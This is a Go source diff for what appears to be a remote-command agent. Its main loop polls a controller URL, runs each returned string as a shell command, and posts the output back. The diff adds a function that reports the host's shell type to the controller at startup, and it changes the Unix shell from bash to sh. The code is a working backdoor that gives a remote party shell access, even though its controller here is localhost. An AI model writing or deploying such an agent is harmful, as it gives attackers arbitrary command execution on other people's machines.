@@ -14,6 +14,34 @@ import (
 
 const URL string = "http://localhost:5000"
 
+func sendinfo() {
+	formData := url.Values{}
+	switch runtime.GOOS {
+
+	case "windows":
+		{
+			formData.Set("info", "Shell: CMD")
+		}
+	default:
+		{
+			formData.Set("info", "Shell: SH")
+		}
+	}
+
+	req, err := http.NewRequest("POST", URL, strings.NewReader(formData.Encode()))
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+
+	client := &http.Client{}
+	resp, err := client.Do(req)
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer resp.Body.Close()
+}
 func ret(output string) {
 	formData := url.Values{}
 	formData.Set("return", output)
@@ -43,7 +71,7 @@ func run(command string) {
 		}
 	default:
 		{
-			cmd = exec.Command("bash", "-c", command)
+			cmd = exec.Command("sh", "-c", command)
 		}
 	}
 
@@ -57,6 +85,7 @@ func run(command string) {
 
 }
 func main() {
+	sendinfo()
 	for true {
 		resp, _ := http.Get(URL)
 		bytes, _ := io.ReadAll(resp.Body)
